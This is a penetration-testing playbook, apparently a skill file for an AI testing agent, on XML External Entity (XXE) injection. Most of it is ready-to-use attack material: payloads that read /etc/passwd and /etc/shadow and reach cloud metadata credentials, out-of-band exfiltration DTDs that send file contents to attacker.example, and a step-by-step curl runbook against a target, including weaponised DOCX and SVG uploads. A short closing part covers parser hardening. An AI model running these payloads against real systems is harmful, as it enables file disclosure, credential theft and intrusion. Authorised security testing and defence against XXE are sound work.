---
name: xxe
description: XXE testing for external entity injection, file disclosure, and SSRF via XML parsers
---

# XXE

XML External Entity injection is a parser-level failure that enables local file reads, SSRF to internal control planes, denial-of-service via entity expansion, and in some stacks, code execution through XInclude/XSLT or language-specific wrappers. Treat every XML input as untrusted until the parser is proven hardened.

## Attack Surface

**Capabilities**
- File disclosure: read server files and configuration
- SSRF: reach metadata services, internal admin panels, service ports
- DoS: entity expansion (billion laughs), external resource amplification

**Injection Surfaces**
- REST/SOAP/SAML/XML-RPC, file uploads (SVG, Office)
- PDF generators, build/report pipelines, config importers

**Transclusion**
- XInclude and XSLT `document()` loading external resources

## High-Value Targets

**File Uploads**
- SVG/MathML, Office (docx/xlsx/ods/odt), XML-based archives
- Android/iOS plist, project config imports

**Protocols**
- SOAP/XML-RPC/WebDAV/SAML (ACS endpoints)
- RSS/Atom feeds, server-side renderers and converters

**Hidden Paths**
- Parameters: "xml", "upload", "import", "transform", "xslt", "xsl", "xinclude"
- Processing-instruction headers

## Detection Channels

### Direct

- Inline disclosure of entity content in the HTTP response, transformed output, or error pages

### Error-Based

- Coerce parser errors that leak path fragments or file content via interpolated messages

### OAST

- Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)

### Timing

- Fetch slow or unroutable resources to produce measurable latency differences (connect vs read timeouts)

## Core Payloads

### Local File

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

### SSRF

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI">]>
<r>&xxe;</r>
```

### OOB Parameter Entity

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
```

evil.dtd:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%f;.attacker.tld/'>">
%e; %exfil;
```

## Key Vulnerabilities

### Parameter Entities

- Use parameter entities in the DTD subset to define secondary entities that exfiltrate content
- Works even when general entities are sanitized in the XML tree

### XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

Effective where entity resolution is blocked but XInclude remains enabled in the pipeline.

### XSLT Document

XSLT processors can fetch external resources via `document()`:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-stylesheet PI consumers.

### Protocol Wrappers

- Java: `jar:`, `netdoc:`
- PHP: `php://filter`, `expect://` (when module enabled)
- Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes

## Bypass Techniques

**Encoding Variants**
- UTF-16/UTF-7 declarations, mixed newlines
- CDATA and comments to evade naive filters

**DOCTYPE Variants**
- PUBLIC vs SYSTEM, mixed case `<!DoCtYpE>`
- Internal vs external subsets, multi-DOCTYPE edge handling

**Network Controls**
- If network blocked but filesystem readable, pivot to local file disclosure
- If files blocked but network open, pivot to SSRF/OAST

## Special Contexts

### SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

### SAML

- Assertions are XML-signed, but upstream XML parsers prior to signature verification may still process entities/XInclude
- Test ACS endpoints with minimal probes

### SVG and Renderers

- Inline SVG and server-side SVG→PNG/PDF renderers process XML
- Attempt local file reads via entities/XInclude

### Office Docs

- OOXML (docx/xlsx/pptx) are ZIPs containing XML
- Insert payloads into document.xml, rels, or drawing XML and repackage

## Operational Runbook

Once a candidate XML-accepting endpoint is identified, this is the canonical XXE exploitation flow.

### Step 1 — confirm XML parsing accepts DOCTYPE

```bash
# Baseline benign XML
curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
    -d '<?xml version="1.0"?><root>baseline</root>'

# Add a DOCTYPE; if parser doesn't error → DTD processing enabled
curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY bar "test">]><root>&bar;</root>'
# If response echoes "test" → entity expansion works
```

### Step 2 — local file disclosure

```bash
# Classic: read /etc/passwd
curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
    --data-raw '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'

# Read multi-line files that break XML parsers (binary, etc.)
# via CDATA wrapping in parameter entities
curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
    --data-raw '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM &#x27;file:///etc/shadow&#x27;>">
  %param1;
]>
<root>&exfil;</root>'
```

### Step 3 — OOB exfiltration (parameter entities — for files that break inline XML)

```bash
# Host a malicious DTD on attacker server
cat > /var/www/attacker/evil.dtd <<'EOF'
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.example/?d=%data;'>">
%param;
%exfil;
EOF

# Trigger the parser to fetch + execute the remote DTD
curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
    --data-raw '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.example/evil.dtd">%remote;]>
<root/>'

# /etc/passwd content arrives in the attacker's web log as a query string
tail -f /var/log/nginx/access.log | grep attacker
```

### Step 4 — XXE → SSRF (cloud metadata)

```bash
# AWS IMDSv1 (no token required)
curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
    --data-raw '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&xxe;</root>'

# GCP metadata (requires Metadata-Flavor header — works only if XXE can issue headers; rare)
# Internal services
curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
    --data-raw '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.kube:8080/api/v1/namespaces">]>
<root>&xxe;</root>'
```

### Step 5 — blind XXE via XInclude / XSLT

When the response doesn't echo entity content, try alternate parsers:

```xml
<!-- XInclude (libxml2 with xinclude enabled) -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>

<!-- XSLT — server-side stylesheet processing -->
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.example/x.xsl"?>
<!-- where x.xsl uses document() or php:function for RCE -->
```

### Step 6 — non-XML content-type carriers (overlooked variants)

XML parsers lurk in places you wouldn't expect — try these content types:

```bash
# SOAP endpoints
curl -sX POST '<TARGET>/soap' -H 'Content-Type: text/xml; charset=utf-8' \
    --data-raw '<?xml version="1.0"?>...XXE payload here...'

# RSS / Atom feed ingest
curl -sX POST '<TARGET>/feeds' -H 'Content-Type: application/rss+xml' \
    --data-raw '...'

# OOXML upload (DOCX = zip containing XML — repackage with XXE in document.xml)
mkdir -p /tmp/xxe-docx; cd /tmp/xxe-docx
unzip /tmp/clean.docx
sed -i 's|<w:body>|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><w:body>\&xxe;|' word/document.xml
zip -r /tmp/xxe.docx .
curl -sF "file=@/tmp/xxe.docx" '<TARGET>/upload'

# SAML — login endpoints accepting signed SAML assertions
# (extract the SAMLResponse field from a valid POST, decode base64, modify, re-encode)

# SVG upload — SVGs are XML
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>' > /tmp/xxe.svg
curl -sF "file=@/tmp/xxe.svg" '<TARGET>/upload'
```

### Step 7 — capture evidence

Document:
- Confirmed XXE primitive (entity expansion succeeded)
- Bytes exfiltrated (or OAST callback received)
- Severity: **critical** if cloud-metadata creds extracted or SSH keys read; **high** otherwise.
- Mitigation note: disable DOCTYPE processing (`XML_PARSE_NOENT=0` in libxml2; `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` in Java).

## Testing Methodology

1. **Inventory consumers** - Endpoints, upload parsers, background jobs, CLI tools, converters, third-party SDKs
2. **Capability probes** - Does parser accept DOCTYPE? Resolve external entities? Allow network access? Support XInclude/XSLT?
3. **Establish oracle** - Error shape, length/ETag diffs, OAST callbacks
4. **Escalate** - Targeted file/SSRF payloads
5. **Validate parity** - Same parser options must hold across REST, SOAP, SAML, file uploads, and background jobs

## Validation

1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT)
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence
3. Confirm blind channels with OAST and correlate to the triggering request
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths)
5. Bound impact: exact files/data reached or internal targets proven

## False Positives

- DOCTYPE accepted but entities not resolved and no transclusion reachable
- Filters or sandboxes that emit entity strings literally (no IO performed)
- Mocks/stubs that simulate success without network/file access
- XML processed only client-side (no server parse)

## Impact

- Disclosure of credentials/keys/configs, code, and environment secrets
- Access to cloud metadata/token services and internal admin panels
- Denial of service via entity expansion or slow external resources
- Code execution via XSLT/expect:// in insecure stacks

## Pro Tips

1. Prefer OAST first; it is the quietest confirmation in production-like paths
2. When content is sanitized, use error-based and length/ETag diffs
3. Probe XInclude/XSLT; they often remain enabled after entity resolution is disabled
4. Aim SSRF at internal well-known ports (kubelet, Docker, Redis, metadata) before public hosts
5. In uploads, repackage OOXML/SVG rather than standalone XML; many apps parse these implicitly
6. Keep payloads minimal; avoid noisy billion-laughs unless specifically testing DoS
7. Test background processors separately; they often use different parser settings
8. Validate parser options in code/config; do not rely on WAFs to block DOCTYPE
9. Combine with path traversal and deserialization where XML touches downstream systems
10. Document exact parser behavior per stack; defenses must match real libraries and flags

## Summary

XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.
